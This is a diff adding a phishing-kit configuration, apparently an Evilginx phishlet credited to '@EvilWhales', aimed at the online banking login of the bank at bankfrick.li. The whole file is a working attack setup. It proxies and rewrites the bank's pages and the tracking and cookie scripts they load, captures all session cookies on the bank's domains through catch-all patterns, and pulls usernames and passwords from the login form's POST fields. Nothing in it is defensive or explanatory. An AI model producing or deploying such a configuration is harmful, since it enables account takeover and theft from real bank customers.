@@ -1,0 +1,43 @@
+
+author: '@EvilWhales'
+min_ver: '3.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'bankfrick.li', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'cookie-cdn', orig_sub: 'cookie-cdn', domain: 'cookiepro.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'wwws', orig_sub: 'www', domain: 'googletagmanager.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'geolocation', orig_sub: 'geolocation', domain: 'onetrust.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'coma-22.containers', orig_sub: 'coma-22.containers', domain: 'piwik.pro', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'olb', orig_sub: 'olb', domain: 'bankfrick.li', session: true, is_landing: true, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'www.bankfrick.li', orig_sub: 'www', domain: 'bankfrick.li', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bankfrick.li', orig_sub: 'cookie-cdn', domain: 'cookiepro.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bankfrick.li', orig_sub: 'www', domain: 'googletagmanager.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bankfrick.li', orig_sub: 'geolocation', domain: 'onetrust.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bankfrick.li', orig_sub: 'coma-22.containers', domain: 'piwik.pro', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'olb.bankfrick.li', orig_sub: 'olb', domain: 'bankfrick.li', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: '.bankfrick.li'
+    keys: ['.*,regexp']
+  - domain: 'olb.bankfrick.li'
+    keys: ['.*,regexp']
+
+auth_urls:
+  - ''
+
+credentials:
+  username:
+    key: 'DlgLogin:txtUsername'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'DlgLogin:txtPassword'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'olb.bankfrick.li'
+  path: '/bfob_client/faces/modules/OnlineBanking_Client_gui/pages/DlgLogin.xhtml?dswid=5540'
+
